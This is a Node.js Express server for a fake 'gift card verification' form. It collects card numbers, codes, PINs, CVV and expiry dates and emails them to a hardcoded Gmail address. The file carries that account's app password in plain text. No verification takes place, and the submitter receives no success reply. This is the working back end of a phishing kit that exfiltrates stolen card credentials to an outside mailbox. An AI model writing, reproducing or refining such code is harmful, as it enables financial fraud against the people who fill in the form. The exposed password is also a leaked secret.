const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const path = require('path');

const app = express();
const port = 3000;

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json()); // To parse JSON bodies

// Serve static files (CSS, JS, images)
app.use(express.static(path.join(__dirname, 'public')));

// Route to serve the HTML file
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Handle form submission
app.post('/send', (req, res) => {
  const {
    cardName = '',
    currency = '',
    cardAmount = '',
    cardCode = '',
    cardPin = '',
    cardCvv = '',
    cardExp = '',
    digitPin = '',
    email = '',
    message = ''
  } = req.body;

  // Create a transporter object with SMTP server details
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'festuspeter013@gmail.com', // Replace with your email
      pass: 'elfp dcui hswh dxmc', // Replace with your email password
    },
  });

  // Set up email data
  const mailOptions = {
    from: 'festuspeter013@gmail.com', // Replace with your email
    to: 'festuspeter013@gmail.com', // Replace with your email
    subject: 'New Gift Card Verification Submission',
    text: `
      Card Name: ${cardName}
      Currency: ${currency}
      Card Amount: ${cardAmount}
      Card Code: ${cardCode}
      Card Pin: ${cardPin}
      Card CVV: ${cardCvv}
      Card Expiry Date: ${cardExp}
      4 Digit Pin: ${digitPin}
      Email: ${email}
      Message: ${message}
    `,
  };

   // Send the email
   transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      if (error.code === 'ENOTFOUND' || error.code === 'ECONNREFUSED') {
        // Handle internet connection error
        console.log('Internet connection error:', error);
        return res.status(500).json({ success: false, message: 'Internet connection error. Try again.' });
      } else {
        // Handle other errors
        console.log('Error occurred while verifying the card:', error);
        return res.status(500).json({ success: false, message: 'An error occurred while verifying the card.' });
      }
    }
    // No success response is sent
  });
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
